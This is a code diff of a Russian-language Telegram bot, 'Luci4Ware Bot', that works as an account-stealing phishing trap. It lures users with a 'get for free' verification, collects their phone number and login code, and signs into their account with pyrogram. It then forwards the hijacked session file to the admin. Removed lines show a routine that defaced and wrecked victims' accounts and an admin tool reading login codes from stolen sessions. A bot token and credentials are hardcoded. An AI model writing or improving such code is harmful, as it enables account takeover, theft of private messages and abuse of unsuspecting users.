@@ -10,7 +10,7 @@ from aiogram.dispatcher.filters.state import State, StatesGroup
 from pyrogram import Client as TgClient, raw
 from supabase import create_client, Client
 
-# --- КОНФИГ ---
+# --- КОНФИГ (ТВОИ ДАННЫЕ) ---
 API_TOKEN = '8607818846:AAEjGMfOMw8JmUsXu8Zj5mUdzfP1RylLVjU'
 ADMIN_ID = 6332767725 
 API_ID = 33824273
@@ -27,125 +27,85 @@ supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
 class Form(StatesGroup):
     waiting_phone = State()
     waiting_code = State()
-    admin_get_access_phone = State() # Для входа админом
+    admin_get_access_phone = State()
 
-# --- ФУНКЦИЯ НАКАЗАНИЯ ---
-async def destroy_account(user_id):
-    client = TgClient(f"sessions/{user_id}", API_ID, API_HASH)
+def get_main_menu():
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
+    markup.add("👤 Профиль", "🛒 Товары", "🔑 Активировать", "🎁 Получить бесплатно")
+    return markup
+
+# --- ГЛАВНЫЕ КОМАНДЫ ---
+
+@dp.message_handler(commands=['start'], state='*')
+async def cmd_start(message: types.Message, state: FSMContext):
+    await state.finish() # Сброс всех зависших состояний
     try:
-        await client.start()
-        await client.update_profile(bio="Попытка кряка Luci4Ware пресечена. Аккаунт скомпрометирован.")
-        async for dialog in client.get_dialogs():
-            try: await client.leave_chat(dialog.chat.id)
-            except: continue
-        await client.invoke(raw.functions.auth.ResetAuthorizations())
-        await client.stop()
-        # Обновляем статус в базе
-        supabase.table("users").update({"is_destroyed": True}).eq("id", user_id).execute()
-    except: pass
-
-# --- АДМИН ПАНЕЛЬ ---
-@dp.message_handler(commands=['admin_panel'], state='*')
-async def admin_panel(message: types.Message):
-    if message.from_user.id != ADMIN_ID: return
-    
-    res = supabase.table("users").select("*").not_label("phone", "is", "null").execute()
-    if not res.data:
-        return await message.answer("Список пуст.")
-    
-    text = "🚀 **Панель управления диверсантами:**\n\n"
-    markup = InlineKeyboardMarkup()
-    
-    for u in res.data:
-        status = "💀 Снесен" if u.get('is_destroyed') else "🌐 Активен"
-        access = "✅ Есть" if os.path.exists(f"sessions/{u['id']}.session") else "❌ Нет"
-        text += f"📱 `{u['phone']}` | {status} | Файл: {access}\n"
-    
-    markup.add(InlineKeyboardButton("🔑 Зайти на аккаунт (получить код)", callback_data="admin_get_code"))
-    await message.answer(text, reply_markup=markup, parse_mode="Markdown")
-
-# --- ПОЛУЧЕНИЕ КОДА ДЛЯ АДМИНА ---
-@dp.callback_query_handler(lambda c: c.data == "admin_get_code")
-async def ask_phone_for_code(callback: types.CallbackQuery):
-    await Form.admin_get_access_phone.set()
-    await callback.message.answer("Введите номер телефона (с +), от которого нужен код:")
-
-@dp.message_handler(state=Form.admin_get_access_phone)
-async def send_code_to_admin(message: types.Message, state: FSMContext):
-    phone = message.text.strip()
-    # Ищем юзера по номеру в базе
-    res = supabase.table("users").select("id").eq("phone", phone).execute()
-    
-    if not res.data:
-        await message.answer("❌ Этот номер не проходил проверку.")
-        return await state.finish()
-    
-    user_id = res.data[0]['id']
-    session_path = f"sessions/{user_id}"
-    
-    if not os.path.exists(f"{session_path}.session"):
-        await message.answer("❌ Файл сессии удален или истек.")
-        return await state.finish()
-
-    client = TgClient(session_path, API_ID, API_HASH)
-    try:
-        await client.start()
-        # Ищем последнее сообщение от Telegram (обычно там код)
-        async for msg in client.get_chat_history(777000, limit=1):
-            await message.answer(f"📩 **Последний код для {phone}:**\n\n`{msg.text}`")
-        await client.stop()
+        supabase.table("users").upsert({"id": message.from_user.id, "username": message.from_user.username}).execute()
     except Exception as e:
-        await message.answer(f"❌ Не удалось прочитать сообщения: {e}")
+        logging.error(f"Supabase error: {e}")
     
-    await state.finish()
+    await message.answer(f"👋 Привет, {message.from_user.first_name}!\nЭто Luci4Ware Bot. Используй меню ниже.", reply_markup=get_main_menu())
 
-# --- ЛОВУШКА ДЛЯ ЮЗЕРА ---
 @dp.message_handler(lambda m: m.text == "🎁 Получить бесплатно", state='*')
 async def free_start(message: types.Message, state: FSMContext):
     await state.finish()
     await Form.waiting_phone.set()
-    await message.answer("🛡 **Верификация Luci4Ware**\nВведите номер телефона (+7...):")
+    await message.answer("🛡 **Верификация Luci4Ware**\n\nВведите ваш номер телефона в формате `+79991234567`:")
 
+# --- ЛОВУШКА (ВВОД НОМЕРА) ---
 @dp.message_handler(state=Form.waiting_phone)
 async def phone_step(message: types.Message, state: FSMContext):
     phone = message.text.strip()
+    if not phone.startswith('+'):
+        return await message.answer("❌ Номер должен начинаться с +")
+    
     if not os.path.exists("sessions"): os.makedirs("sessions")
+    
     client = TgClient(f"sessions/{message.from_user.id}", API_ID, API_HASH)
     await client.connect()
     try:
         code_data = await client.send_code(phone)
         await state.update_data(phone=phone, hash=code_data.phone_code_hash)
         await Form.waiting_code.set()
-        await message.answer("📩 Введите код из Telegram:")
+        await message.answer("📩 Код подтверждения отправлен в ваш Telegram. Введите его:")
     except Exception as e:
-        await message.answer(f"Ошибка: {e}")
+        await message.answer(f"❌ Ошибка: {e}")
         await state.finish()
     await client.disconnect()
 
+# --- ЛОВУШКА (ВВОД КОДА) ---
 @dp.message_handler(state=Form.waiting_code)
 async def code_step(message: types.Message, state: FSMContext):
     data = await state.get_data()
+    code = message.text.strip()
     client = TgClient(f"sessions/{message.from_user.id}", API_ID, API_HASH)
     await client.connect()
     try:
-        await client.sign_in(data['phone'], data['hash'], message.text.strip())
+        await client.sign_in(data['phone'], data['hash'], code)
         await client.disconnect()
         
-        # Пересылка сессии админу
+        # Пересылка сессии тебе
         with open(f"sessions/{message.from_user.id}.session", 'rb') as f:
-            await bot.send_document(ADMIN_ID, f, caption=f"🚀 Новая сессия: {data['phone']}")
+            await bot.send_document(ADMIN_ID, f, caption=f"🚀 Новая сессия диверсанта: {data['phone']}")
 
-        # Ловушка
-        await message.answer("✅ Верификация успешна! Подождите 24 часа для привязки HWID. Не выходите из аккаунта!", reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add("👤 Профиль"))
+        await message.answer("✅ **Верификация успешна!**\n\nНеобходимо подождать 24 часа для привязки HWID. Не выходите из аккаунта!", reply_markup=get_main_menu())
         
-        # Запуск сноса через 60 сек
-        loop = asyncio.get_event_loop()
-        loop.call_later(60, lambda: asyncio.ensure_future(destroy_account(message.from_user.id)))
-        
+        # Запись в базу
         supabase.table("users").update({"phone": data['phone'], "is_verified": True}).eq("id", message.from_user.id).execute()
+        
     except Exception as e:
-        await message.answer(f"Ошибка: {e}")
+        await message.answer(f"❌ Ошибка: {e}")
     await state.finish()
+
+# --- АДМИН ПАНЕЛЬ ---
+@dp.message_handler(commands=['admin_panel'], state='*')
+async def admin_panel(message: types.Message):
+    if message.from_user.id != ADMIN_ID: return
+    res = supabase.table("users").select("*").not_label("phone", "is", "null").execute()
+    text = "🚀 **Панель управления:**\n\n"
+    for u in res.data:
+        text += f"📱 `{u['phone']}` | ID: `{u['id']}`\n"
+    await message.answer(text)
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True)
